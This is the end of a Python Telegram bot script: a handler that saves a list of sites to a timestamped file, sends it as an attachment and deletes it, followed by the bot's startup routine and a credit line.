        ts = _dt.datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = f"sites_{ts}.txt"
        with open(fname, 'w') as f:
            f.write("\n".join(sites))
        await event.reply(
            pe(f"🌐 Sites ({len(sites)}):\n\nFile attached."),
            file=fname, parse_mode='html'
        )
        try:
            os.remove(fname)
        except Exception:
            pass



async def main():
    await bot.start(bot_token=BOT_TOKEN)
    await _startup()
    print("[✓] Bot running — Made by @Onyxa_a")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
